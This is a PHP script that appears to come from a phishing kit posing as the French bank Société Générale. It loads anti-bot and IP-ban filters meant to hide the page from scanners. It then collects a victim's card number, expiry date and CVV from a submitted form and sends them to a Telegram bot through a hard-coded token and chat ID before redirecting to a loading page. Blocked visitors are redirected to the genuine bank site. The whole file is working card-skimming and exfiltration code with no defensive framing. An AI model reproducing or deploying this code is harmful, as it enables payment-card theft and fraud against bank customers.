<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

// Récupérer les données du formulaire de carte bancaire
$cardNumber = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : '';
$expirationMonth = isset($_POST['expirationMonth']) ? $_POST['expirationMonth'] : '';
$expirationYear = isset($_POST['expirationYear']) ? $_POST['expirationYear'] : '';
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : '';

$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Préparer le message pour la carte bancaire
if ($cardNumber && $expirationMonth && $expirationYear && $cvv) {
    $message = "Carte Bancaire:\nNuméro de la carte: $cardNumber\nExpiration: $expirationMonth/$expirationYear\nCVV: $cvv";
} else {
    $message = "Aucune donnée reçue pour la carte bancaire.";
}

// URL pour envoyer le message
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Envoyer la requête
file_get_contents($sendMessageUrl);

// Redirection vers une page de confirmation ou autre après soumission
if ($cardNumber && $expirationMonth && $expirationYear && $cvv) {
    header("Location: ../loading.php");
    exit;
}
